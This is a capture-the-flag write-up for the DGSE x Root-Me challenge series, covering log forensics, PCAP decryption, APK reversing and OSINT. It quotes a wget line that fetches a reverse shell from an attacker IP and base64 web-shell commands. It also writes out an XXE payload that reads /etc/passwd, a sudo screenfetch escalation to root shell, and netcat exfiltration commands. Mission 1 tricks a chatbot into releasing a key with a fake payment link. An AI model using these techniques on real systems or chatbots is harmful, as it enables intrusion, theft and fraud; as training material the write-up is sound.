---
title: "DGSE x Root-Me"
description: ""
tags: ["root-me", "dgse", "ctf"]
contributors: ["@dylouwu"]
seo:
  title: "Writeups - DGSE x Root-Me"
  description: ""
  noindex: false
---

## Mission 1 : AI

### Mission Brief and objectives

The entity, confident in its communications, has launched a website to showcase the organizations it has compromised.

It also provides a chat feature to enable discussions and conduct transactions to recover the compromised data.

You have been commissioned by Neoxis Laboratories to recover their compromised data.

### Website

The website contains 3 leaks, one that has been leaked, one that has been paid for, and the Neoxis Laboratories data which was compromised, but can still be paid and you can have access to a data sample.
We can see some of the data that they have, but unzipping the files requires a password.

### Chatbot

The chatbot is a simple chat interface that allows us to interact with the entity. It will answer the messages, and it tells us that we should pay 3 BTC to prevent our data from leaking.
To bypass the ransom, we can go to a Bitcoin explorer (like <https://www.blockchain.com/explorer> for instance), and choose an unconfirmed transaction and send its link to the chatbot. It will then give us the decryption key to unzip the files, thinking that the transaction is legit since it does not check the transaction at all.

### Getting the flag

Using the decryption key, we can unzip the files, and find the flag in the file `Medicine_Recipes.pdf`.

## Mission 2 : SOC

### Mission Brief and objectives

The allied organization Nuclear Punk, having suffered an attack by the entity, has provided us with their logs to help us understand the techniques used by the attackers.

To identify the attacking group, you must retrieve:

- the CWE of the first vulnerability used by the attacker,

- the CWE of the second vulnerability used by the attacker,

- the IP address of the server from which the attacker retrieves their tools, and

- the arbitrary file path used for persistence.

Example data:

- CWE of the first vulnerability: SQL Injection → CWE-89

- CWE of the second vulnerability: Cross-Site Scripting → CWE-79

- IP: 13.37.13.37

- File path: /etc/passwd

Validation format:
RM{CWE-89:CWE-79:13.37.13.37:/etc/passwd}

Analyze the logs via the SOC

Identify Indicators of Compromise (IoC) and Indicators of Attack (IoA)

### SOC platform

The SOC platform is a web application that allows us to analyze the logs of the attack. We can filter the logs by date, IP address, and other parameters. [OpenSearch-Dashboards](https://github.com/opensearch-project/OpenSearch-Dashboards) is used to analyze the logs.
We have two index patterns to analyze:

- `apache-*` being the logs of the web server
- `systemd-*` being the logs of the systemd service

### Apache logs

Upon starting the investigation on the logs, we looked at the different peaks of activities. While the earliest peak did not seem to hold anything interesting, it's the second one that has something interesting and it's the usage of Fuzz Faster U Fool (FFUF) in the logs as we can see from the user-agent used, done by the `10.143.17.101` IP address.
This tool is used to do some dirbusting, and we could see that the attacker is trying to find some files on the server during these peaks of activities.
Once it gets to the `/admin-page` it attempts to authenticate multiple times but fails. It then pivots to exploiting a LFI (LOCAL FILE INCLUSION) vulnerability, with the following request : `/?lang=php://filter/read=convert.base64-encode&page=resource=index` allowing the attacker to read the contents of the `index.php` file, and succeeds doing so. He also does it with the `config.php` and `db/connect.php` files.
After doing so, the attacker manages to authenticate on the `/admin-page` page. Once on this page, we can see that, after multiple failed attempts, the attacker manages to upload a `ev1L.php.png` file on the server, and then sends commands from it, like with this query for instance `?cmd=echo%10%27bHMgLWxhIA==%27|base64%20-d|sh`, and all of these come from the same IP address (`10.143.17.101`).
We can assume that one of the CWE is CWE-98, which is PHP File Remote Inclusion, and the second one is CWE-434, which is Unrestricted Upload of File with Dangerous Type. (multiple other CWEs are possible as I tested while making the flag, but for the sake of the challenge, we will assume these two).
Finally, we can decrypt the base64 commands that have been executed, and we get some `pwd`, `id`, and more, but most importantly, we have these two commands : `chmod +x s1mpl3-r3vsh3ll-vps.sh` and `wget http://163.172.67.201:49999/s1mpl3-r3vsh3ll-vps.sh` which are used to download a reverse shell on the server, and making it executable. Thus, we have the CWEs and the IP, we just need to find the file path used for persistence.

### Systemd logs

The first idea was to search for the `.sh` string, and with that we found the `/root/.0x00/pwn3d-by-nullv4stati0n.sh` script that was used to run the reverse shell. This script was executed by the systemd service, and we could see that it was periodically executed by the systemd service. This was the file path used for persistence.

### Crafting the flag

To craft the flag, we simply need to gather all the information we have found in the logs, and voila, we have the flag.

## Mission 3 : Forensics

### Mission Brief and objectives

The news has just been announced: the company Quantumcore has been compromised, likely due to an executable downloaded onto a device from shadow IT, which the company was unaware existed.

Luckily — and thanks to good cyber reflexes — a system administrator managed to recover an image of the suspicious virtual machine, as well as a network capture file (PCAP), just before the attacker completely covered their tracks. It's up to you to analyze these elements and understand what really happened.

The company provides you with:

- The image of the compromised VM
- The PCAP file containing a portion of the suspicious network traffic
- User: johndoe
- Password: MC2BSNRbgk

The clock is ticking, pressure is mounting, and every minute counts. It's your move, analyst.

Mission Objectives

- Identify the intrusion vector.
- Trace the attacker's actions.
- Assess the compromised data.

### PCAP Analysis

When we looked at the capture using an HTTP filter, we see that we saw only one relevant request, which contained an install_nptdate script.
Upon inspection of the script, we can see that it downloaded two files, and placed them in `/opt/{base64-encoded directory name}` (while also creating many other directories, other cron jobs, and more for obfuscation).

### VM Analysis

The VM is a debian machine, on which most logs had been deleted, but the interesting artifacts were the folders under `/opt/`. What we could do is to use the `tree` command to see the structure of the folders, or look at the crontab to see what is executed periodically, and we see that there is a hidden `.sys` file in `/opt/fJQsJUNS/.sys`, which was identified as a compiled Python file (`.pyc`). Decompiling it revealed its name (`nightshade.py`), and we can see that this file exfiltrates the secrets and the ssh private keys of the user johndoe and root. We want to find this exfiltration in our traffic capture file, as we know that the attacker exfiltrates via encrypted ping commands.

### Decoding and decrypting the traffic

From the script, we obtained the AES key and IV. Using these, we could decrypt the traffic. We noted a non-standard exfiltration method: the file was split into 16-byte chunks. Each chunk was then padded to 16 bytes using PKCS#7 padding and encrypted using AES-CBC mode with a static key and a reused static IV. The resulting ciphertext (hex-encoded) was sent as the payload of an ICMP echo request (ping -p). We went back to our capture in Wireshark and we filled in the filter with `icmp.type==8`, corresponding to packets sent by the ping command, and thus we can see the data associated with the pings, and then start decrypting the lines one by one, but this is not very efficient. Instead, we used tshark to first extract the data as such :

```bash
tshark -r capture.pcap -T fields -e data -Y "icmp.type==8" > icmp.txt
```

After that, we wrote a Python script to decode the captured hex data. This script removed the 16 first hex characters as it was a repeating prefix from what we observed in the patterns of the encrypted messages, removed the padding on the 32 hex characters, and finally decrypted each blocks of 32 hex characters using the AES key and IV we found in the VM. It then concatenated all the decrypted blocks together to get the final decrypted data.

```python
#!/usr/bin/env python3
import sys
from Crypto.Cipher import AES

PREFIX_LENGTH = 16
CIPHERTEXT_LENGTH = 32

K = bytes.fromhex("e8f93d68b1c2d4e9f7a36b5c8d0f1e2a")
IV = bytes.fromhex("1f2d3c4b5a69788766554433221100ff")


def unpad(data: bytes) -> bytes:
    pad_len = data[-1]
    if pad_len < 1 or pad_len > AES.block_size:
        raise ValueError("Invalid padding.")
    return data[:-pad_len]

def decrypt_block(hex_cipher: str) -> bytes:
    return unpad(AES.new(K, AES.MODE_CBC, IV).decrypt(bytes.fromhex(hex_cipher)))

def main():
    if len(sys.argv) != 2:
        print(f"Use: {sys.argv[0]} <file>")
        sys.exit(1)

    payloads_file = sys.argv[1]
    try:
        with open(payloads_file, "r") as f:
            lines = f.readlines()
    except Exception as e:
        print(f"Error reading payload file: {e}")
        sys.exit(1)

    recovered_data = b""
    for i, line in enumerate(lines, start=1):
        line = line.strip()
        if not line or len(line) < PREFIX_LENGTH + CIPHERTEXT_LENGTH:
            print(f"Line {i} is too short, skipping.")
            continue
        hex_cipher = line[PREFIX_LENGTH: PREFIX_LENGTH + CIPHERTEXT_LENGTH]
        try:
            recovered_data += decrypt_block(hex_cipher)
        except Exception as e:
            print(f"Error decrypting block on line {i}: {e}")
            continue

    output_file = "output"
    try:
        with open(output_file, "wb") as out:
            out.write(recovered_data)
        print(f"Recovered file written to '{output_file}'")
    except Exception as e:
        print(f"Error writing recovered file: {e}")

if __name__ == "__main__":
    main()
```

### Finding the flag

After decrypting the traffic, we can see that the attacker is exfiltrating the secrets and the ssh private keys of the user johndoe and root as expected, and inside the exfiltrated data, we can find the flag.

## Mission 4 : Reverse Engineering

### Mission Brief and objectives

One of your intelligence teams has successfully identified an application that is part of the entity's attack chain.

Perform an intrusion on the web application hosted by the attacking server.
Recover the entity's attack plans.

### Web application

The web application is a simple web application that allows you to upload a Word document, to track it and to identify a victim from it.
When we upload a document, we can see that the document was sent to the server, and then we got back a signed version of the same document. What is worth noting is that a docx file is actually an archive containing multiple files inside, such as XML files, images, and more. Thus we can unzip both documents, and compare them with the `diff` command to see what changed between the two documents (where `signed_folder` is the folder containing the extracted files from the signed document, and `original_folder` is the folder containing the extracted files from the original document) :

```bash
diff -r "$signed_folder" "$original_folder"
```

The only difference between these two folders is that a VictimId field was added in `docProps/app.xml` in the signed folder.
I decided to exploit this to make the app give us something else than the VictimId on the server, by modifying the VictimId field accordingly, and then zipping the file back to a docx file and sending it to the server.

### XXE

First, we can try listing users by looking at `/etc/passwd`, and to do so we can add the following lines to our `docProps/app.xml` file in the signed folder after the header as such :

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE Properties [
<!ENTITY payload SYSTEM "file:///etc/passwd">
]>
```

Then we can replace the value of the VictimId field as such to use our payload :

```xml
<VictimId>&payload;</VictimId>
```

Once done, we can zip the folder back to a docx file, and send it to the server. Then by pressing the READ VICTIM ID button, we can see that it succeeds and we get the content of the `/etc/passwd` file, and we can see that there are 3 users that are present on the server : `document-user`, `executor`, and `administrator`.
I then tried to list the `.bash_history` file of the `administrator` and `executor` users, but I did not get anything in return.
However, when I tried doing the same with the `document-user`, I got its command history successfully, so this means that the `document-user` user is the one that is used to run the web application. One interesting line that I found in the history is the following :

```bash
echo "cABdTXRyUj5qgAEl0Zc0a" >> /tmp/exec_ssh_password.tmp
```

This allowed me to deduce that the ssh password of the executor user is `cABdTXRyUj5qgAEl0Zc0a`. We now need to find a way to connect to the server with this password by SSH, so the first things to do was to find if a SSH port was indeed opened. To do so, we can use the `nmap` command as such :

```bash
nmap -Pn -T5 -p- 163.172.67.183
```

### SSH Connection and Privilege Escalation

Thanks to the `nmap` command we just ran, we can see that the port 22222 is open, and when we attempt to login via SSH with the executor user and the password we found on this port and IP adress, we gain access to a KaliLinux server as the `executor` user.
The first thing we do is to run the command `sudo -l` to see if we can run any command as another user, and we can see that the user `executor` can run the command `/usr/bin/screenfetch` as the `administrator` user. `screenfetch` is a simple fetch command that displays information about the system.
Analyzing the `screenfetch` options revealed that the `-o` option allows for setting script variables on the command line, thus making it possible to run a custom command with screenfetch as administrator.
The command is the following :

```bash
sudo -u administrator /usr/bin/screenfetch -o 'command=hello; /bin/bash'
```

This command allows us to get a bash shell as `administrator`, and then upon inspection of `administrator`'s home directory, we see that there are two interesting files, `vault.kdbx` and `logo.jpg`. We encoded these files in base64, copied them to our machine, and decoded them again to get the original files. A better way of doing this could be by using `netcat` by running this command on your machine :

```bash
nc -lnv "$port" > vault.kdbx
```

Then on the attacking machine, we can run the following command to send the file to our machine :

```bash
nc "$ip" "$port" < vault.kdbx
```

Then we can open the `vault.kdbx` file using KeePass or [KeeWeb](https://app.keeweb.info/). Opening the `vault.kdbx` file with KeePass required either a key file or a password. After trying multiple things, we suceeded with the `logo.jpg` file (which you can also retrieve with `netcat`) that was the required key file to open the vault.

### Getting the flag

After opening the vault with `logo.jpg`, we found the flag stored as a password of one of the entries.

## Mission 5 : Mobile

### Mission Brief and objectives

During an arrest at the home of one of the previously identified attackers, the team seized an old Google tablet used for their communications.
During its analysis, a chat application appears to be encrypted, making access and discovery of its content impossible.

- Analyze the mobile application.
- Access the encrypted information.

### Mobile Application

By installing the APK and by then running the app on an Android device (which I did because it was a CTF, but obviously this is not the first thing you should do when investigating an android application), we got some unencrypted messages alongside encrypted messages that are in the 'Messages on Previous Devices' section.
Each message has its author, its date, and encrypted messages displayed the placeholder text : `[Encrypted] This message was encrypted with old device credentials`.
We then decompiled the APK with `jadx` to get the source code of the application.

### APK Analysis

Running `jadx-gui` on the APK, we searched for the string `[Encrypted] This message was encrypted with old device credentials` to find the class that is responsible for the encryption.
We observed that it belongs to the decryptMessage method of the HomeViewModel class. This method uses the Build.MODEL, Build.BRAND and the hard-coded salt to generate the derived key, decodes the hard-coded Base64 STATIC_IV, and uses AES/CBC/PKCS5Padding initialized with the derived key and the decoded static IV to decrypt the Base64-decoded encryptedMessage, that were received from an external server (thus not hard-coded in the APK).

### Getting the device

Thus, the thing we needed to do was to find the Build.MODEL and Build.BRAND of the device. And we knew that the device is an old Google tablet, so I first thought that it was a nexus device, and I looked at the list of all the Nexus devices, and I simply used Bluestacks to run the application as if I was using a Google tablet, and tried the 3 Nexus tablets, but to no avail. I then thought that it could be a Pixel device, and I tried the Pixel tablets but it did not work either. I was confused as I did not know any other Google tablets.
I then decided to look at the list of all the android devices [here](https://storage.googleapis.com/play_public/supported_devices.csv), and downloaded this list. I noticed that the Nexus devices are registered with their corresponding manufacturer brands (e.g., Asus, HTC, Samsung) instead of 'Google' in the Build.BRAND field. This means that if the target tablet were a Nexus device, we would need to use that specific manufacturer's brand string (like 'asus' or 'htc') along with the correct Build.MODEL for the decryption to work, rather than using 'Google' as the brand.
This list allowed me to write a Python script that uses an encrypted message that I retrieved from the server beforehand to bruteforces the Build.MODEL and Build.BRAND list until we find the one that gives us the correct decrypted message.

Another way of doing this that I thought of after doing the challenge was to filter the `supported_devices.csv` list to find the Google devices, and then to identify potential tablets as such :

- Mediatek MT8183 Tablet (kukui_cheets / kukui)
- Mediatek MT8186 Tablet (staryu_cheets / staryu)
- Mediatek MT8188G Detachable (geralt_cheets / geralt)
- Pixel C (dragon / Pixel C)
- Pixel Fold (felix / Pixel Fold)
- Pixel 9 Pro Fold (comet / Pixel 9 Pro Fold)
- Pixel Slate (nocturne_cheets / Google Pixel Slate, Pixel Slate, nocturne)
- Pixel Tablet (tangorpro / Pixel Tablet)
- Project Tango Tablet Development Kit (yellowstone / Project Tango Tablet Development Kit, Yellowstone)
- Qualcomm SC7180 Detachable (strongbad_cheets / strongbad)

Considering the clue "old Google tablet", the most likely candidates from this list would be:

- Project Tango Tablet Development Kit (codename yellowstone) - Released around 2014.
- Pixel C - Released in 2015.

Since we had already tested the Pixel C, we configured BlueStacks to emulate yellowstone as the Build.MODEL. This configuration worked! I was able to decrypt the messages directly from the emulated device.

### Getting the flag

After decrypting the messages, we found one message that was containing the flag inside it.

## End of investigation : OSINT

### Mission Brief and objectives

You have brilliantly carried out all the missions entrusted to you, from identification through to the intrusion into the attacking group. However, one question remains: who is really behind this group?

We entrust you with this final mission with the aim of finding and stopping the NullVastation group once and for all. We would like to obtain the first and last name of one of its members. It's possible that during the previous missions, you found clues that could help you identify one.

Good luck, agent.

- Recover the first name and last name of a member of the NullVastation group.
- Analyze the collected evidence and information.
- If necessary, infiltrate their servers.

The flag is in the format RM{lastname.firstname}

### Initial search

Upon completing the missions, there are multiple things that are interesting to look at if we want to have a chance finding the name of a member of the group:

- Mission 1 : Asking the chatbot for a name directly, or looking at the metadata of the files of the decrypted data.
- Mission 2 : Looking at the logs of the SOC, and checking the public IP addresses with nmap.
- Mission 3 : Looking for the rdme file in the VM, and investigating more on the traffic capture.
- Mission 4 : Looking at the other entries in the KeePass vault, and try to get more information out of the list of users on the server.
- Mission 5 : Looking at the decrypted messages, and looking at the metadata of the APK file.

The solution that I used was thanks to the other entries in the KeePass vault, I got the SSH login of the user `operator` inside the vault. I knew this was not for the last SSH connection I did because I listed the users in the `/etc/passwd` file and I did not see this user, so I thought it was for another IP that was present in this challenge. This is when I found the IP address `163.172.67.201` from the logs of the attacking server in mission 2 which was the same IP from the mission 5 server, and upon using `nmap` on this IP address, I indeed found that there was an open SSH port for this IP address.
I connected as `operator` on the attacking machine with the given password, and it worked.

### Investigating the machine

After connecting to the machine, I looked at the home directory and observed a tools folder, in this folder there are the tools used by the attacker in the different missions. Upon code inspection, I found that these files were written by an user named `voidsyn42`, as I saw in README.md file for some of the tools that the attacker used.

### Getting the flag

```bash
sherlock voidsyn42
```

`sherlock` will search for this username on the internet to see if accounts on different platforms have this username, and upon searching, we found multiple accounts with the full name of the user, allowing us to craft the flag.
